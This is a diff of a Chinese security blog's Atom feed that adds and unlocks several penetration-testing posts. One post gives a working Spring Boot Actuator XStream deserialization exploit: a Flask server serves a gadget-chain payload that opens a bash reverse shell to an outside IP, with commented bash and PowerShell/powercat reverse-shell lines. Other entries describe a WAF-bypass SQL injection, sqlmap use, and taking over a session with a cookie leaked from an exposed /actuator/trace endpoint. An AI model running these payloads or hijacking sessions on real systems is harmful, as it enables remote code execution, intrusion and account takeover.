@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.wafer.org.cn/"/>
-  <updated>2020-06-16T14:57:23.244Z</updated>
+  <updated>2020-07-11T11:41:28.805Z</updated>
   <id>https://www.wafer.org.cn/</id>
   
   <author>
@@ -15,6 +15,56 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Bypass 网防G01 注入</title>
+    <link href="https://www.wafer.org.cn/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/"/>
+    <id>https://www.wafer.org.cn/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/</id>
+    <published>2020-07-11T11:22:17.969Z</published>
+    <updated>2020-07-11T11:41:28.805Z</updated>
+    
+    <content type="html"><![CDATA[<p><img data-src="/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/1.png" alt="1.png"></p><a id="more"></a><p>在某活动遇到了一个网防G01 WAF bypass这个waf总体比较简单<br>注入点在搜索处,好像只有这处被waf拦截,其他注入地方未被拦截,而且这个站到处都是存在注入…可怕.<br><img data-src="/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/2.png" alt="2.png"><br><img data-src="/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/3.png" alt="3.png"><br>直接上图很简单,只是做个记录<br>这里直接使用脏数据来进行bypass,还有我这里为什么指定注入类型为布尔型而不是报错型<br>因为报错注入需要的脏数据远远超越布尔型产生的日志所以综合考虑布尔更加合适.<br><img data-src="/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/5.png" alt="4.png"><br><img data-src="/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/5.png" alt="5.png"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/1.png&quot; alt=&quot;1.png&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="WAF" scheme="https://www.wafer.org.cn/categories/WAF/"/>
+    
+    
+      <category term="Bypass" scheme="https://www.wafer.org.cn/tags/Bypass/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Spring Boot Actuator(XStream反序列化RCE)</title>
+    <link href="https://www.wafer.org.cn/2020/06/30/Spring_Boot_Actuator(XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE)/"/>
+    <id>https://www.wafer.org.cn/2020/06/30/Spring_Boot_Actuator(XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE)/</id>
+    <published>2020-06-30T06:57:27.483Z</published>
+    <updated>2020-06-30T06:57:27.483Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><p>利用条件<br>可以 POST 请求目标网站的 /env 接口设置属性<br>可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）<br>目标使用的 eureka-client &lt; 1.8.7（通常包含在 spring-cloud-starter-netflix-eureka-client 依赖中）<br>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p><p>eureka.client.serviceUrl.defaultZone</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># linux反弹shell bash -i &gt;<span class="symbol">&amp;amp;</span> /dev/tcp/192.168.20.82/9999 0&gt;<span class="symbol">&amp;amp;</span>1</span></span><br><span class="line"><span class="xml"># windows反弹shell</span></span><br><span class="line"><span class="xml"># <span class="tag">&lt;<span class="name">string</span>&gt;</span>powershell<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml"># <span class="tag">&lt;<span class="name">string</span>&gt;</span>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml"># <span class="tag">&lt;<span class="name">string</span>&gt;</span>powercat -c 192.168.123.1 -p 2333 -e cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">from flask import Flask, Response</span></span><br><span class="line"></span><br><span class="line"><span class="xml">app = Flask(__name__)</span></span><br><span class="line"></span><br><span class="line"><span class="xml">@app.route('/', defaults=</span><span class="template-variable">&#123;'path': ''&#125;</span><span class="xml">)</span></span><br><span class="line"><span class="xml">@app.route('/<span class="tag">&lt;<span class="name">path:path</span>&gt;</span>', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="xml">def catch_all(path):</span></span><br><span class="line"><span class="xml">    xml = """<span class="tag">&lt;<span class="name">linked-hash-set</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">"javax.crypto.NullCipher"</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"java.util.Collections$EmptyIterator"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &gt;<span class="symbol">&amp;amp;</span> /dev/tcp/88.88.88.88/3333 0&gt;<span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;/<span class="name">next</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">method</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"string"</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">linked-hash-set</span>&gt;</span>"""</span></span><br><span class="line"><span class="xml">    return Response(xml, mimetype='application/xml')</span></span><br><span class="line"><span class="xml">if __name__ == "__main__":</span></span><br><span class="line"><span class="xml">    app.run(host='0.0.0.0', port=2222)</span></span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;利用条件&lt;br&gt;可以 POST 请求目标网站的 /env 接口设置属性&lt;br&gt;可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）&lt;br&gt;目标使用的 eur
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞挖掘" scheme="https://www.wafer.org.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
+    
+    
+      <category term="SRC" scheme="https://www.wafer.org.cn/tags/SRC/"/>
+    
+  </entry>
   
   <entry>
     <title>某银行hw总结</title>
@@ -94,13 +144,17 @@
     <link href="https://www.wafer.org.cn/2020/06/15/bypass360%20SQL%E6%B3%A8%E5%85%A5/"/>
     <id>https://www.wafer.org.cn/2020/06/15/bypass360%20SQL%E6%B3%A8%E5%85%A5/</id>
     <published>2020-06-15T12:30:02.704Z</published>
-    <updated>2020-06-15T12:38:28.195Z</updated>
+    <updated>2020-07-11T11:24:34.345Z</updated>
     
-    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e99e9234d81670a1f035f21368c4524694434472ded0372d8a55f4a365a7a5cd">d9632929f5d11d770df9e72c422396b529a7dda64eb1b446a4097581b81da4dd03bcbe41fdb9b7d18d7b94cf845340e2d95327063cb3ea1d0d72f8afe6b02a0652c2541ad6d76bf8533eb62ad5fa2032f8da3692a71a3b7cf8022c18158b42c0fa244889c1a09625f36d2b2789eced6a7ae5662a3afac01ee53541e08c336a3523bae95fe37f7969b6843d2c9055fd0b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    <content type="html"><![CDATA[<p>由于本人比较懒就附上链接.<br><a href="https://www.t00ls.net/thread-55980-1-1.html" target="_blank" rel="noopener">Tools</a></p>]]></content>
     
     <summary type="html">
     
-      Here&#39;s something encrypted, password is required to continue reading.
+      
+      
+        &lt;p&gt;由于本人比较懒就附上链接.&lt;br&gt;&lt;a href=&quot;https://www.t00ls.net/thread-55980-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Tools&lt;/a&gt;&lt;/p&gt;
+
+      
     
     </summary>
     
@@ -117,13 +171,17 @@
     <link href="https://www.wafer.org.cn/2020/06/15/%E5%AE%9E%E6%88%98bypass%E5%AE%9D%E5%A1%94%E6%B3%A8%E5%85%A5/"/>
     <id>https://www.wafer.org.cn/2020/06/15/%E5%AE%9E%E6%88%98bypass%E5%AE%9D%E5%A1%94%E6%B3%A8%E5%85%A5/</id>
     <published>2020-06-15T12:25:57.055Z</published>
-    <updated>2020-06-15T12:38:22.337Z</updated>
+    <updated>2020-07-11T11:24:11.540Z</updated>
     
-    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="6608d6e6e74f0c4cf4d2c2d789b632d45bdf0f010814edc80b6307dc4ee426d5">c378c43e35f5e4c1938971d85984ef6b2ae9428ba304a8d842e54904c2f56afdbfd1155e53cc0dbcc59df7a70eb565dc24f097474c13efe0192c34b058de04c13464bfa65de1afc771489f12170661da368a8004966488d98e2e1f5f9031d04ee3eeb88942ab1a70069f25377db5394fe514ac001a90d6fab1178906b7e28d59dcf67d0518cbee667dc497d4901f1cec2038c61b36da4c1f0187aefadc44ed11</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    <content type="html"><![CDATA[<p>由于首发圈子就附上链接<br><a href="https://www.secquan.org/Discuss/1071118" target="_blank" rel="noopener">实战bypass宝塔注入</a></p>]]></content>
     
     <summary type="html">
     
-      Here&#39;s something encrypted, password is required to continue reading.
+      
+      
+        &lt;p&gt;由于首发圈子就附上链接&lt;br&gt;&lt;a href=&quot;https://www.secquan.org/Discuss/1071118&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;实战bypass宝塔注入&lt;/a&gt;&lt;/p&gt;
+
+      
     
     </summary>
     
@@ -140,13 +198,17 @@
     <link href="https://www.wafer.org.cn/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/"/>
     <id>https://www.wafer.org.cn/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/</id>
     <published>2020-06-15T09:31:55.013Z</published>
-    <updated>2020-06-15T12:09:31.950Z</updated>
+    <updated>2020-06-30T06:38:18.693Z</updated>
     
-    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="cb857fd377a62833115a33cb89e0ae0af0f0060c2d06ccf866b49ccc681306e4">d3e32a3374481e313ba6af1317ddf6b6febd0408877a347808aa43c17644b4022a0c3d30cd13584417805e77d4f95dea35d87c6053ce6eaa8d7b8e55d5aa568fdbec8d971bea79b7c435b7b8b43f43fab7c21ba772dae128aeb1286553edb4e624c46071a23839d78d0487712e608c1981c9391bb2ad7a05119a405af0a8b197d325b5ea0d7bd9407193038ab3c2f4232af70abb9b5ce0c688c3bfee760735fd0b1e47189524867fc3c7fd53f04915db398164fe4623d0fcbdd78a8daca215341d70a8bbcd282a7b5a74846a5eebefb675b282ad0aa32e2e8a903665772419b4d0c2f3741556a62255d4235f9f9a3b57fc4b2a5b9d39d2267cbfa41b14ae5e3139e24cf59aaca8c7aabc32775ebcba9e1da7af857c6202e45da67ae6437e0ab6fb10d176da5f312eb5ee3bc84d5534459f9d711ab41b4d872d8f35388dc0807c799166a47fdf89bd35e598c3e91cb881f0b66048016c21c5cdeae9d63ebb202a11e59a60e3db7c75b7122c0cdeee4f2dfef0e5b1a3f98b088755bc6aff7afa6ea84137eaa1369c6f7d4c9437b960ccf86e37aa56f72dab343b0bf984358bcd3b25c3ef358bbf988c572119b7ae126917e47602b78686bd835603e9784ef46bc7d91f6595f208186da3db8f79d6ca5f5559bc097cd8f22452b90a62b921f3dcd7a24e48af636ccab33f634edefba4f0d50d2ee75bc7b8c688469d7c3a0790450f539661fa493702710d93999d9090203cd47134fe0002c2350a54b68630e5f2f4f0a27ed7d0ca9a514e5b51e711343413bd11a79479bae007e1578d7b5ea3a87522531c93c5ea8a29e709cd61077c3741804d32e3a499d7969a1cf93ea82f6129d5960318accef14568321399ff0d5908b7dd087dff2a149689629f42b93954ffa5f461b40a3be196256a4834fc614fbf38447c40d7f7d458a5444d0fdbe940382c4cc3579e5d857a5e2697e953720d906451a4802b128db3ed797bb8a0ef817b246fa1b788367bee1d9b573c62f1e34fedadc1a69a525f4b54ffea75dc0e3f1074f3361666b8f233719bb92096e7f1db302ab9b9d4d8d1b4cef3981ed7dd4ba35862c7dcb17d905b2d3b2756d18ff4b4b590d4e6c0048e95d38a6200466b1b56ecb05c949f41b1b9dcf7215cec7bae2db81d9421b57b030a67ce3c4099b49a84f04e40965cd67a33c1a57b13b392ede78e6200bd8662f79c4cf1b9ea88cd1b213fbba30dc1fd179b2324db6276bb536196d0da069ca37d48b17e2b1308cf194474413b63f07160dd862acb6bb30b4a2e44b70cc3fc3c8ea885fcef7b7f2aa71617ad6740ef947b998943fa866e0c4bb3eb2fba7c66218fcdaeaa39eba460c47e20bec63d2434825b9b75508ea5ef7b62760125db8a843da7f1804bc7f7e4bd13b0d2e1a347e9e1216103c6f91a0f61c4fde6188e510b0901f8ff0746e77ee427e5c4d73d8a3a25528623fab4aefa8619c0cc1fb945b9134bc27741ed97376f3b2956ec747580dbbffd25124c169c4e116e0ebb66b3d0978c49fa4cb6a99e75b08114e17bfd9530ff5c312f0bfbf16ce05a65a2d16f6fd22aa26f284d9669f25ca867f20331b65ca31f8df4f226861c0496483dc6305ce6ea1ee851eb4747ad92a2e3867e13a8c2bd5389fd9b69f1cb3e1aa929be4307ef57f4e145222463b45c1c61c454ac8fe0d5caa95e626169563a4981de08e0449e69754d57447e038022ce93b9943bab947897c3fc239e8b87b0ca6836e9062f9609b83b6a30efc5ad38be9363c8c6ab4bddc588b806778082f457b758d894bf3ecf4f54be800481c5c7965c5039e43ef254799dc088da0ad8c2c2cba8112322fac4da45ffd4f2e61c90a191666f4faf9e56b37673dbc1deea19a2b178c1b784d6d86719734d8cc4d98db2ac6e6944028059609f0b341e79544fa1abf98aa2a160f7a86bd1fb32ec2f4b2a884ad264455d050f0998e53b698ab41104b7f892507e599754ee8795f190859d3db4040eb9ed7f15ae17d4bb54061ee9cd0b9aabcd9abd38a405eb54f7da16f1285bc6cf0f51e41990cbfbf90f42c97c74a6281454d45478d19063456f88e96a34539ecb28f8ce34c44c8a9cc90c0d7ca7d2dc6824498d2838a7730a4c1250b5d3014600daa49bd18c2f1cee9860d8b88bcd79d2d1f6294295a09d49cec9688d0170315f1001864eafdc47dcca08bc4a6a8190ebb96340b7cd4fec5ba4acf56a5d523df2c77e87b178d81d64bc161e8582d153972024f60a9f2a7333892d471d2a2d826cb6d4008f5af0a0c0e27e5c5a09f21b6963164400b7263596f4d936571ac42bfc611c6f8a74bb025a3e1e7d0e750489c2e7df97d1ab54aa852337db900b4aa9754612878295a684e298480c96d84c1277f9841971d7d5292016dd92bfe8f4823628c811603dba9469d4bca2423b11bd2098391053b8cbc02bc80f58a5a332d943d3deaee027f4319a7cec255eb4446fa1771a905ffe1678013086ecdbee1dd48f4e3f8aabc37ea1dc571e9a83cbabf3cc03de8da7a887cef8ba1db0a1ed03134ab837952e86b178153f50f0a786b176442b2575b60edf7bbd13ead741810f28128edd356bb28137d9d262ebbc1f0b370f2c2e38886caa38b37a9a15ab77a52a2b846ab5dea73d3674fc9184897896e86c34f8491c22cc639cac135772961b5eebecc00113148c29cf848096f198b0c3bf1e76a268eb1b03cee96ce09302bad5c665be978cd37895385bd04abe130e48003d5ff7a60ad1cf0b14fbde177c10d8395b2972ce2261c88238f72a652eb297d8afafceb8e320bcc26ad7ff2199e85766fded768f664240a48e8b49b560ac1b4edf06e296051b2a6a69a4de2d5628ade85102b09017e93115314f72f69c8430838ee426e382717c6052e74e49cd769c9d240568c305538007621543ea18a3f992277ea0beb2f8dc3e543b6825b8e437d17f27740f54ade1d53842afc06d199671751cf9d397158076703d0d0182f7682b800e26d98743ebf38784b8cda699d993ffefd932ede064190c0f79fe3ec302c8f6f987038d75a468cef26d2a7a0ead6729886e496a5943d6468135705a5bbc818213120c875d4ea0f585d33dfae49b0e4f828450cc986c8a130fef698525c6484b6afdc80e4f94976b5c9d7b7c089baa61ad263f5e9bc387bcba93cae260d1bc1044b4ebd7db305c742de9bf3a77c12f1c2290df4c37377321f2b77dffcdf543fe8c56d60ca20cad3810fb2d06b298946e0cae1e1be819ba96bce1d617c9a495fd527c981cdbd1b4c31c8d99eba5a662e97e3d36a0052784cf4b7a1d83378cd8ae634750968226dc77eb2540aebc6b4c738e7516976508835ed32f1f3864757fd7671dd69a2d81a4956ccb44e0b7e6abb739ef34caacdc535fb05572fd7b090e746ebd157920d9f24370d7ff9672485eb04aec6a5b33739b80e25cbce6efa30c9c96aa56dbba831525d3599b2cc68d3b1f291acc046dc2c5a69e6fc45b14197baf3836f9613837c798aff183c46aad850c9dcf38e4942c841eb0e80373c2c85225f746924289603bc409e3a255480231223353cff46a67b356151db7415984e211d378c659adc86f74954cf77fa64626f468d9cb8c617075b67d28dd9aeb4bcaa9c1d46e69c70d4bc9681f77ed25d7207b32efcd6ffaa35b9ae2e2cf5d5fb491e7bc71cea0b79d240dbc0cf2c07946760d732829996efd2ead453028987b218c4d3dd157b90760ad11435e78b998ab882cb0d6ac66532889b15d24aa1da16213e6e4d0ed45fd23bac5d287cbbec144b74d4b5cb8f9ac3f20bc88b9a37f369258896bc12c80e137064d79d382b13def37efe4f9acebc56e32840206fece991ac2043bfa885134b2ee59f33650b9054197ed7faaaa0511cddd35abc4a3c4c2c5cc85447be0acabaf7c8d5112486b7655f1bbce261e57da03c5b0e5a0b13317bc1a8e910f4e5862d0fd6bef69edfd85a9dc3183877f7639ed2ed9d315b90282f2cf0011d97edd0dffb18c9a9e276fb989975baa3ea11b55198916bdc98f9c0c79efb649ab50582b76a64c97ccd2d9a4c2ee45b02d0222a3eeb6bcc8af9590f38d2c8affbe7552463d6c8a42768f48429289484a24d836ec2e3a009b0ee041499b684f9c1a10fb7c9ed0514a42a44842750ff51f5c5ef6342a63873b049e9b86385caccaff8f59346f218ada90e230537ad5e3e8fb2d06ff00d284067e211cf13e4b2f5034612f40d89d4a87a126e7a02922752895ab8d3e4946aa2ae4bd36687af74d8eb23754f50efa4ea23955c1d1e8123d5ca78e4a1606e54e04d84ec190b0e0504140b50d2a84a67bf2321463b44166deb5009786eefd9a5589925224603cef04963f75e25f82c6f4c8aa7aa1521fdb3e893d682997993f79a139be125bcc491908ec247e5126fb0f9dc37968408910c95f6eb836212f82454323fac0bf1fb32110e1d0903aa1347cab0bf0d2a3585ea2ed00cfd1b27ecba9a0927e8f11a654f6de3ae526671be544ec5d4db68b005688ebff765fe39ee930c9d76006acf36b81b63a81085ced50329f260ee87ca2b3e9ca49a875c7c9db6514fc44f515b7ce039c89aab815dfa5d729539025541ba0fcdd83cfa070138a7bb207548f9309f80024cf5ad3600203c6bea4c9540be00b264696c1559469dc8d2dd12c48ed61b75e50c4482a7763d636ed175fb63af759c2ef67acf7a0ab7ac2f06b09047a4f9366798401279c8dc02ff76d9488a15399c4d515d1fb8b73d13b434f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    <content type="html"><![CDATA[<a id="more"></a><p>是不是看到这种统一身份认证中心是不是感觉无从下手.<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/2.png" alt="2.png"></p><p>这里接口从js里面找到,其实我后面扫了下目录发现也可以找到.<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/1.png" alt="1.png"></p><p>由于这里漏洞被修复就没办法截图了,漏洞报告里面看不清楚,就只能描述下,这里毫无防护直接丢进sqlmap跑<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/3.png" alt="3.png"><br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/4.png" alt="4.png"></p><p>由于我询问了下审核人员这里能否深入,他说到表就行了,只能放弃从注入登录后台<br>在这个测出注入前我发现这个站是spring boot框架,测试发现存在Spring Boot Actuator未授权访问<br>这里简单讲下Springboot的actuator配置</p><p>/autoconfig    提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过<br>/configprops    描述配置属性（包含默认值）如何注入 Bean<br>/beans    描述应用程序上下文里全部的 Bean，以及它们的关系<br>/dump    获取线程活动的快照<br>/env    获取全部环境属性<br>/env/{name}    根据名称获取特定的环境属性值<br>/health    报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供<br>/info    获取应用程序的定制信息，这些信息由 info 打头的属性提供<br>/mappings    描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系<br>/metrics    报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数<br>/metrics/{name}    报告指定名称的应用程序度量值<br>post    /shutdown    关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）<br>/trace    提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）<br>/auditevents    显示应用暴露的审计事件 (比如认证进入、订单失败)<br>/loggers    显示和修改配置的loggers<br>/flyway    显示数据库迁移路径的详细信息<br>/liquidbase    显示Liquibase 数据库迁移的纤细信息<br>/scheduledtasks    显示应用中的调度任务<br>/threaddump    执行一个线程dump<br>/heapdump    返回一个GZip压缩的JVM堆dump<br>/logfile    返回log file中的内容(如果logging.file或者logging.path被设置)</p><p><a href="http://xxxx/esc-sso/actuator/trace" target="_blank" rel="noopener">http://xxxx/esc-sso/actuator/trace</a> 运气也好蹲着一个员工未失效的cookie直接替换登录<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/5.png" alt="5.png"><br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/6.png" alt="6.png"><br>这里还存在获取被星号脱敏的密码的明文由于没有截图就不讲了放下连接<br><a 